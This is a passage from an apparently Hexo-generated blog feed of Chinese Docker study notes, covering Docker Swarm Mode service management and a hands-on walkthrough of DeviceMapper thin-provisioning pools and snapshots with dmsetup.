class="line"></div><div class="line">To add a manager to this swarm, run &apos;docker swarm join-token manager&apos; and follow the instructions.</div></pre></td></tr></table></figure>
<p>  以后如果查看token信息，可以执行 docker swarm join-token worker<br>将node2添加到节点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@node2 ~]# docker swarm join \</div><div class="line">     --token SWMTKN-1-457lrm2xagck8zy5ce9njycvybj9fsurgsh71ihhotol4ivtmj-ds0l8ld19esrbev349v6r4hd1 \</div><div class="line">     192.168.1.102:2377</div><div class="line">This node joined a swarm as a worker.</div></pre></td></tr></table></figure>
<p>  再次查看node1节点信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# docker node ls</div><div class="line">ID                           HOSTNAME   STATUS  AVAILABILITY  MANAGER STATUS</div><div class="line">1r64t4ljem9e4l2e8pnxx9p5o *  node1  Ready   Active        Leader</div><div class="line">e4ch01lolinm7g49tu38tfib3    node2  Ready   Active</div></pre></td></tr></table></figure>
</li>
<li><p>在node1上建立服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# docker service create --replicas 1 --name dv citizenstig/dvwa</div><div class="line">5zgu87rqr7k5ieg7la5so03j1</div><div class="line">[root@node1 ~]# docker service ls</div><div class="line">ID            NAME  REPLICAS  IMAGE             COMMAND</div><div class="line">5zgu87rqr7k5  dv    1/1       citizenstig/dvwa  </div><div class="line">[root@node1 ~]# docker service inspect --pretty dv</div><div class="line">ID:             5zgu87rqr7k5ieg7la5so03j1</div><div class="line">Name:           dv</div><div class="line">Mode:           Replicated</div><div class="line"> Replicas:      1</div><div class="line">Placement:</div><div class="line">UpdateConfig:</div><div class="line"> Parallelism:   1</div><div class="line"> On failure:    pause</div><div class="line">ContainerSpec:</div><div class="line"> Image:         citizenstig/dvwa</div><div class="line">Resources:</div><div class="line"></div><div class="line">[root@node1 ~]# docker service ps dv</div><div class="line">ID                         NAME  IMAGE             NODE       DESIRED STATE  CURRENT STATE               ERROR</div><div class="line">7t5qj48rzmeezc1q0rd663gcm  dv.1  citizenstig/dvwa  node1  Running        Running about a minute ago</div></pre></td></tr></table></figure>
</li>
<li><p>扩容 scale</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# docker service scale dv=3</div><div class="line">dv scaled to 3</div><div class="line">[root@node1 ~]# docker service ps dv</div><div class="line">ID                         NAME  IMAGE             NODE       DESIRED STATE  CURRENT STATE             ERROR</div><div class="line">7t5qj48rzmeezc1q0rd663gcm  dv.1  citizenstig/dvwa  node1  Running        Running 2 minutes ago     </div><div class="line">9ohh5xlgffbmzuc8rcfc3bvyu  dv.2  citizenstig/dvwa  node2  Running        Preparing 14 seconds ago  </div><div class="line">20dygfzgpfoilxkdg7lffy47v  dv.3  citizenstig/dvwa  node2  Running        Preparing 14 seconds ago  </div><div class="line"></div><div class="line">我们查看一下任务在2个节点的分布状态</div><div class="line">[root@node1 ~]# docker ps -a        </div><div class="line">CONTAINER ID        IMAGE                     COMMAND                  CREATED             STATUS                   PORTS                          NAMES</div><div class="line">443133ab06bf        citizenstig/dvwa:latest   &quot;/run.sh&quot;                9 minutes ago       Up 9 minutes             80/tcp, 3306/tcp               dv.1.7t5qj48rzmeezc1q0rd663gcm</div><div class="line">[root@node2 ~]# docker ps -a   </div><div class="line">CONTAINER ID        IMAGE                                              COMMAND                  CREATED             STATUS                    PORTS               NAMES</div><div class="line">0aa62a67014c        citizenstig/dvwa:latest                            &quot;/run.sh&quot;                2 minutes ago       Up 2 minutes              80/tcp, 3306/tcp    dv.2.9ohh5xlgffbmzuc8rcfc3bvyu</div><div class="line">a2131cd7d1b4        citizenstig/dvwa:latest                            &quot;/run.sh&quot;                2 minutes ago       Up 2 minutes              80/tcp, 3306/tcp    dv.3.20dygfzgpfoilxkdg7lffy47v</div></pre></td></tr></table></figure>
</li>
<li><p>停止服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# docker service rm dv</div><div class="line">dv</div><div class="line">[root@node1 ~]# docker service ps dv</div><div class="line">Error: No such service: dv</div></pre></td></tr></table></figure>
</li>
<li><p>滚动更新<br>前提：集群中的节点都包括了相同的images，这里使用citizenstig/dvwa</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">docker service create \</div><div class="line">    --replicas 3 \</div><div class="line">    --name dvwa \</div><div class="line">    --update-delay 10s \</div><div class="line">    citizenstig/dvwa</div><div class="line">31rs07r46qg6m6jkrxwi0h23g</div></pre></td></tr></table></figure>
<p>  通过以下命令查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker service inspect --pretty dvwa</div><div class="line">docker service ps dvwa</div></pre></td></tr></table></figure>
<p>  升级为 dvwa:v2 这个image,通过以下命令查看变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">docker service update --image dvwa:v2 dvwa</div><div class="line">docker service inspect --pretty dvwa</div><div class="line">docker service ps dvwa</div><div class="line">#清理</div><div class="line">docker service rm dvwa</div></pre></td></tr></table></figure>
</li>
<li><p>管理 worker 节点<br>a. 不可用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker node update --availability drain node2</div><div class="line">docker node ls</div></pre></td></tr></table></figure>
<p>  将 node 设置为 drain 后，表明：该 node 将不会运行任务；可以观察到，该 node 中运行的服务正在自动迁移到线上的其他 node 上。<br>示例：将 manager node 设置为 drain，从而避免任务在该 node 上运行，保持 manager 的单一和资源。<br>b. 激活</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker node update --availability active node1</div></pre></td></tr></table></figure>
<p>  c. 提升为 manager 和降级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">docker node ls</div><div class="line">docker node promote node1</div><div class="line">docker node ls</div><div class="line">docker node demote node1</div></pre></td></tr></table></figure>
</li>
<li><p>overlay 网络</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># 创建一个 覆盖 所有集群的 overlay  网络</div><div class="line">docker network create --driver overlay --opt encrypted --subnet=10.0.9.0/24 my-net</div><div class="line">#使用 --opt encrypted 标识</div><div class="line"></div><div class="line"># 创建 service 时添加 --endpoint-mode dnsrr  使用dns 做为服务发现，否则跨主机之间无法通讯</div><div class="line"># 例:</div><div class="line">docker service create --replicas 3 --name my-nginx --network my-net --endpoint-mode dnsrr nginx:alpine</div><div class="line"></div><div class="line"># 使用 nslookup my-nginx   查询dns 情况</div><div class="line">-----------------------------------------------------------------------------------------------------------</div><div class="line">nslookup: can&apos;t resolve &apos;(null)&apos;: Name does not resolve</div><div class="line">Name:      my-nginx</div><div class="line">Address 1: 10.0.9.3 b177080c9e65</div><div class="line">Address 2: 10.0.9.2 my-nginx.1.0p2gn3h3ujoghub8ilyyvbenq.my-net</div><div class="line">Address 3: 10.0.9.4 my-nginx.3.axmsfkrxd89gbp75j00cu5qqw.my-net</div></pre></td></tr></table></figure>
</li>
<li><p>挂载目录, mount</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker service create --mount type=bind,target=/container_data/,source=/host_data/</div></pre></td></tr></table></figure>
<p>  示例 - 本地目录： target = 容器里面的路径， source = 本地硬盘路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#docker service create --mount type=volume,source=&lt;VOLUME-NAME&gt;,target=&lt;CONTAINER-PATH&gt;,volume-driver=&lt;DRIVER&gt;</div><div class="line"></div><div class="line">docker service create --name nginx --mount type=bind,target=/usr/share/nginx/html/,source=/opt/web/ --replicas 2 --publish 80:80/tcp nginx</div></pre></td></tr></table></figure>
<p>  示例 - 挂载volume卷： source = volume 名称 , traget = 容器里面的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker service create --name nginx --mount type=volume,source=myvolume,target=/usr/share/nginx/html,volume-driver=local --replicas 2 --publish 80:80/tcp nginx</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="常见使用"><a href="#常见使用" class="headerlink" title="常见使用"></a><b>常见使用</b></h5><p>常见的双层（web+db）应用可按以下方法创建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">docker network create -d overlay mynet</div><div class="line">docker service create --name frontend --replicas 5 -p 80:80/tcp \</div><div class="line">--network mynet mywebapp</div><div class="line">docker service create --name redis --network mynet redis:latest</div></pre></td></tr></table></figure></p>
<p>由5套Nginx容器构成的Swarm作为单一内部负载均衡型服务，且于Swarm内任意节点的端口80上进行交付</p>
<p>ref<br><a href="http://nosmoking.blog.51cto.com/3263888/1832212" target="_blank" rel="external">docker深入2-熟悉v1.12</a><br><a href="https://fangs.work/blog/docker-1-12-swarm-mode" target="_blank" rel="external">Docker 1.12 Swarm Mode http://初上手体验</a><br><a href="http://www.dockerinfo.net/1420.html" target="_blank" rel="external">Docker 1.12 Swarm Mode集群实战(第二章)</a><br><a href="https://tangpengcsu.gitbooks.io/docker/content/Docker%E9%9B%86%E7%BE%A4/docker-swarm-mode.html" target="_blank" rel="external">Swarm Mode</a><br><a href="http://www.xf80.com/2016/10/25/docker-swarm-1.12/" target="_blank" rel="external">docker 1.12 swarm</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;Swarm-Mode是什么&quot;&gt;&lt;a href=&quot;#Swarm-Mode是什么&quot; class=&quot;headerlink&quot; title=&quot;Swarm Mode是什么&quot;&gt;&lt;/a&gt;&lt;b&gt;Swarm Mode是什么&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;Swarm Mode 直接集成于 do
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker学习笔记-DeviceMapper</title>
    <link href="https://t1ger.github.io/2016/11/28/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-DeviceMapper/"/>
    <id>https://t1ger.github.io/2016/11/28/docker学习笔记-DeviceMapper/</id>
    <published>2016-11-28T08:09:12.000Z</published>
    <updated>2016-11-28T09:51:37.909Z</updated>
    
    <content type="html"><![CDATA[<h4 id="DeviceMapper简介"><a href="#DeviceMapper简介" class="headerlink" title="DeviceMapper简介"></a><b>DeviceMapper简介</b></h4><p>DeviceMapper自Linux 2.6被引入成为了Linux最重要的一个技术。它在内核中支持逻辑卷管理的通用设备映射机制，它为实现用于存储资源管理的块设备驱动提供了一个高度模块化的内核架构，它包含三个重要的对象概念，Mapped Device、Mapping Table、Target device</p>
<p>Mapped Device是一个逻辑抽象，可以理解成为内核向外提供的逻辑设备，它通过Mapping Table描述的映射关系和Target Device建立映射。Target device表示的是Mapped Device所映射的物理空间段，对Mapped Device所表示的逻辑设备来说，就是该逻辑设备映射到的一个物理设备</p>
<p>Mapping Table里有Mapped Device逻辑的起始地址、范围、和表示在Target Device所在物理设备的地址偏移量以及Target 类型等信息（注：这些地址和偏移量都是以磁盘的扇区为单位的，即512个字节大小，所以看到128的时候，其实表示的是128*512=64K）</p>
<p>DeviceMapper中的逻辑设备Mapped Device不但可以映射一个或多个物理设备Target Device，还可以映射另一个Mapped Device，于是，就是构成了一个迭代或递归的情况，就像文件系统中的目录里除了文件还可以有目录，理论上可以无限嵌套下去</p>
<p>DeviceMapper在内核中通过一个一个模块化的Target Driver插件实现对IO请求的过滤或者重新定向等工作，当前已经实现的插件包括软 Raid、加密、多路径、镜像、快照等，这体现了在Linux内核设计中策略和机制分离的原则。如下图可以看到DeviceMapper只是一个框架，在这个框架上，可以插入各种各样的策略，在这诸多“插件”中，有一个东西叫Thin Provisioning Snapshot，这是Docker使用DeviceMapper中最重要的模块</p>
<h4 id="Thin-Provisioning-简介"><a href="#Thin-Provisioning-简介" class="headerlink" title="Thin Provisioning 简介"></a><b>Thin Provisioning 简介</b></h4><p>Thin Provisioning是虚拟化技术中的一种。类似于虚拟内存技术。操作系统给每个进程N多用不完的内址地址（32位下，每个进程可以有最多2GB的内存空间）。但是物理内存是没有那么多的。所以操作系统引入了虚拟内存的设计。逻辑上给无限多的内存，但是实际上是实报实销，达到了内存使用率提高的效果。 第一个是Fat Provisioning。 第二个是Thin Provisioning</p>
<p>Docker是怎么使用Thin Provisioning这个技术做到像UnionFS那样的分层镜像的呢？答案是，Docker使用了Thin Provisioning的Snapshot的技术,下面我们来介绍一下Thin Provisioning的Snapshot。 先建两个文件，一个是data.img，一个是meta.data.img</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ sudo dd if=/dev/zero of=/tmp/data.img bs=1K count=1 seek=10M</div><div class="line">1+0 records in</div><div class="line">1+0 records out</div><div class="line">1024 bytes (1.0 kB) copied, 0.000621428 s, 1.6 MB/s</div><div class="line">$ sudo dd if=/dev/zero of=/tmp/meta.data.img bs=1K count=1 seek=1G</div><div class="line">1+0 records in</div><div class="line">1+0 records out</div><div class="line">1024 bytes (1.0 kB) copied, 0.000140858 s, 7.3 MB/s</div></pre></td></tr></table></figure>
<p>注意命令中seek选项，其表示为略过of选项指定的输出文件的前10G个output的bloksize的空间后再写入内容。因为bs是1个字节，所以也就是10G的尺寸，但其实在硬盘上是没有占有空间的，占有空间只有1k的内容。当向其写入内容时，才会在硬盘上为其分配空间。可以用ls命令看一下，实际分配了12K和4K</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo ls -lsh /tmp/data.img</div><div class="line">12K -rw-r--r--. 1 root root 11G Aug 25 23:01 /tmp/data.img</div><div class="line">$ sudo ls -slh /tmp/meta.data.img</div><div class="line">4.0K -rw-r--r--. 1 root root 101M Aug 25 23:17 /tmp/meta.data.img</div></pre></td></tr></table></figure>
<p>为这个文件创建一个loopback设备</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo losetup /dev/loop2015 /tmp/data.img</div><div class="line">$ sudo losetup /dev/loop2016 /tmp/meta.data.img</div><div class="line">$ sudo losetup -a</div><div class="line">/dev/loop2015: [64768]:103991768 (/tmp/data.img)</div><div class="line">/dev/loop2016: [64768]:103991765 (/tmp/meta.data.img)</div></pre></td></tr></table></figure>
<p>为这个设备建一个Thin Provisioning的Pool，用dmsetup命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo dmsetup create hchen-thin-pool \</div><div class="line">               --table &quot;0 20971522 thin-pool /dev/loop2016 /dev/loop2015 \</div><div class="line">                        128 65536 1 skip_block_zeroing&quot;</div></pre></td></tr></table></figure>
<p>参数解释如下</p>
<ul>
<li>dmsetup create是用来创建thin pool的命令。</li>
<li>hchen-thin-pool是自定义的一个pool名。</li>
<li>–table是这个pool的参数设置。<br>0代表起的sector位置。<br>20971522代码结句的sector号，一个sector是512字节，20971522个正好是10GB。<br>/dev/loop2016是meta文件的设备。<br>/dev/loop2015是data文件的设备。<br>128是最小的可分配的sector数。<br>65536是最少可用sector的water mark，也就是一个threshold。<br>1 代表有一个附加参数。<br>skip_block_zeroing是个附加参数，表示略过用0填充的块。</li>
</ul>
<p>现在我们可以看到一个Device Mapper的设备了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo ll /dev/mapper/hchen-thin-pool</div><div class="line">lrwxrwxrwx. 1 root root 7 Aug 25 23:24 /dev/mapper/hchen-thin-pool -&gt; ../dm-4</div></pre></td></tr></table></figure>
<p>接下来创建一个Thin Provisioning的Volume</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 &quot;create_thin 0&quot;</div><div class="line">$ sudo dmsetup create hchen-thin-volumn-001 \</div><div class="line">       --table &quot;0 2097152 thin /dev/mapper/hchen-thin-pool 0&quot;</div></pre></td></tr></table></figure>
<ul>
<li>第一个命令中的create_thin是关键字，后面的0表示这个Volume的device的id。</li>
<li>第二个命令是真正的为这个Volumn创建一个可以mount的设备，名字叫hchen-thin-volumn-001。2097152只有1GB。</li>
</ul>
<p>在mount之前，我们格式化一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ sudo mkfs.ext4 /dev/mapper/hchen-thin-volumn-001</div><div class="line">mke2fs 1.42.9 (28-Dec-2013)</div><div class="line">Discarding device blocks: done</div><div class="line">Filesystem label=</div><div class="line">OS type: Linux</div><div class="line">Block size=4096 (log=2)</div><div class="line">Fragment size=4096 (log=2)</div><div class="line">Stride=16 blocks, Stripe width=16 blocks</div><div class="line">65536 inodes, 262144 blocks</div><div class="line">13107 blocks (5.00%) reserved for the super user</div><div class="line">First data block=0</div><div class="line">Maximum filesystem blocks=268435456</div><div class="line">8 block groups</div><div class="line">32768 blocks per group, 32768 fragments per group</div><div class="line">8192 inodes per group</div><div class="line">Superblock backups stored on blocks:</div><div class="line">32768, 98304, 163840, 229376</div><div class="line">Allocating group tables: done</div><div class="line">Writing inode tables: done</div><div class="line">Creating journal (8192 blocks): done</div><div class="line">Writing superblocks and filesystem accounting information: done</div></pre></td></tr></table></figure>
<p>终于可以mount了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo mkdir -p /mnt/base</div><div class="line">$ sudo mount /dev/mapper/hchen-thin-volumn-001 /mnt/base</div><div class="line">$ sudo echo &quot;hello world, I am a base&quot; &gt; /mnt/base/id.txt</div><div class="line">$ sudo cat /mnt/base/id.txt</div><div class="line">hello world, I am a base</div></pre></td></tr></table></figure>
<p>下面来操作snapshot。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 &quot;create_snap 1 0&quot;</div><div class="line">$ sudo dmsetup create mysnap1 \</div><div class="line">                   --table &quot;0 2097152 thin /dev/mapper/hchen-thin-pool 1&quot;</div><div class="line">$ sudo ll /dev/mapper/mysnap1</div><div class="line">lrwxrwxrwx. 1 root root 7 Aug 25 23:49 /dev/mapper/mysnap1 -&gt; ../dm-5</div></pre></td></tr></table></figure>
<ul>
<li>第一条命令是向hchen-thin-pool发一个create_snap的消息，后面跟两个id，第一个是新的dev id，第二个是要从哪个已有的dev id上做snapshot。</li>
<li>第二条命令是创建一个mysnap1的device，并可以被mount</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ sudo mkdir -p /mnt/mysnap1</div><div class="line">$ sudo mount /dev/mapper/mysnap1 /mnt/mysnap1</div><div class="line">$ sudo ll /mnt/mysnap1/</div><div class="line">total 20</div><div class="line">-rw-r--r--. 1 root root 25 Aug 25 23:46 id.txt</div><div class="line">drwx------. 2 root root 16384 Aug 25 23:43 lost+found</div><div class="line">$ sudo cat /mnt/mysnap1/id.txt</div><div class="line">hello world, I am a base</div></pre></td></tr></table></figure>
<p>我们在修改一下/mnt/mysnap1/id.txt，并加上一个snap1.txt的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ sudo echo &quot;I am snap1&quot; &gt;&gt; /mnt/mysnap1/id.txt</div><div class="line">$ sudo echo &quot;I am snap1&quot; &gt; /mnt/mysnap1/snap1.txt</div><div class="line">$ sudo cat /mnt/mysnap1/id.txt</div><div class="line">hello world, I am a base</div><div class="line">I am snap1</div><div class="line">$ sudo cat /mnt/mysnap1/snap1.txt</div><div class="line">I am snap1</div></pre></td></tr></table></figure>
<p>再看一下/mnt/base，你会发现没有什么变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ sudo ls /mnt/base</div><div class="line">id.txt      lost+found</div><div class="line">$ sudo cat /mnt/base/id.txt</div><div class="line">hello world, I am a base</div></pre></td></tr></table></figure>
<p>似乎已经看到了分层镜像的样子。。。<br>在刚才的snapshot上再建一个snapshot</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 &quot;create_snap 2 1&quot;</div><div class="line">$ sudo dmsetup create mysnap2 \</div><div class="line">                   --table &quot;0 2097152 thin /dev/mapper/hchen-thin-pool 2&quot;</div><div class="line">$ sudo ll /dev/mapper/mysnap2</div><div class="line">lrwxrwxrwx. 1 root root 7 Aug 25 23:52 /dev/mapper/mysnap1 -&gt; ../dm-7</div><div class="line">$ sudo mkdir -p /mnt/mysnap2</div><div class="line">$ sudo mount /dev/mapper/mysnap2 /mnt/mysnap2</div><div class="line">$ sudo  ls /mnt/mysnap2</div><div class="line">id.txt  lost+found  snap1.txt</div></pre></td></tr></table></figure>
<p>看到了分层镜像。这里需要补充的理论知识</p>
<ul>
<li>Snapshot来自LVM（Logic Volumn Manager），它可以在不中断服务的情况下为某个device打一个快照</li>
<li>Snapshot是Copy-On-Write的，也就是说，只有发生了修改，才会对对应的内存进行拷贝</li>
</ul>
<h4 id="docker的loopback设备"><a href="#docker的loopback设备" class="headerlink" title="docker的loopback设备"></a><b>docker的loopback设备</b></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo losetup -a</div><div class="line">/dev/loop0: [64768]:38050288 (/var/lib/docker/devicemapper/devicemapper/data)</div><div class="line">/dev/loop1: [64768]:38050289 (/var/lib/docker/devicemapper/devicemapper/metadata)</div></pre></td></tr></table></figure>
<p>其中data 100GB，metadata 2.0GB</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo ls -alhs /var/lib/docker/devicemapper/devicemapper</div><div class="line">506M -rw-------. 1 root root 100G Sep 10 20:15 data</div><div class="line">1.1M -rw-------. 1 root root 2.0G Sep 10 20:15 metadata</div></pre></td></tr></table></figure>
<p>下面是相关的thin-pool。其中，有个当一大串hash串的device是正在启动的容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo ll /dev/mapper/dock*</div><div class="line">lrwxrwxrwx. 1 root root 7 Aug 25 07:57 /dev/mapper/docker-253:0-104108535-pool -&gt; ../dm-2</div><div class="line">lrwxrwxrwx. 1 root root 7 Aug 25 11:13 /dev/mapper/docker-253:0-104108535-deefcd630a60aa5ad3e69249f58a68e717324be4258296653406ff062f605edf -&gt; ../dm-3</div></pre></td></tr></table></figure>
<p>看一下device id</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo cat /var/lib/docker/devicemapper/metadata/deefcd630a60aa5ad3e69249f58a68e717324be4258296653406ff062f605edf</div><div class="line">&#123;&quot;device_id&quot;:24,&quot;size&quot;:10737418240,&quot;transaction_id&quot;:26,&quot;initialized&quot;:false&#125;</div></pre></td></tr></table></figure>
<p>device_id是24，size是10737418240，除以512，就是20971520 个 sector，我们用这些信息来做个snapshot看看（注：我用了一个比较大的dev id – 1024）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sudo dmsetup message &quot;/dev/mapper/docker-253:0-104108535-pool&quot; 0 \</div><div class="line">                                    &quot;create_snap 1024 24&quot;</div><div class="line">$ sudo dmsetup create dockersnap --table \</div><div class="line">                    &quot;0 20971520 thin /dev/mapper/docker-253:0-104108535-pool 1024&quot;</div><div class="line">$ sudo mkdir /mnt/docker</div><div class="line">$ sudo mount /dev/mapper/dockersnap /mnt/docker/</div><div class="line">$ sudo ls /mnt/docker/</div><div class="line">id lost+found rootfs</div><div class="line">$ sudo ls /mnt/docker/rootfs/</div><div class="line">bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var</div></pre></td></tr></table></figure>
<p>在docker的容器里用findmnt命令也可以看到相关的mount的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># findmnt</div><div class="line">TARGET                SOURCE               </div><div class="line">/                 /dev/mapper/docker-253:0-104108535-deefcd630a60[/rootfs]</div><div class="line">/etc/resolv.conf  /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/resolv.conf]</div><div class="line">/etc/hostname     /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/hostname]</div><div class="line">/etc/hosts        /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/hosts]</div></pre></td></tr></table></figure>
<p>ref</p>
<p><a href="http://coolshell.cn/articles/17200.html" target="_blank" rel="external">Docker基础技术：DeviceMapper</a><br><a href="http://70data.net/1172.html" target="_blank" rel="external">Docker学习笔记（六）Linux DeviceMapper</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;DeviceMapper简介&quot;&gt;&lt;a href=&quot;#DeviceMapper简介&quot; class=&quot;headerlink&quot; title=&quot;DeviceMapper简介&quot;&gt;&lt;/a&gt;&lt;b&gt;DeviceMapper简介&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;DeviceMapper自Li
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker学习笔记-AUFS</title>
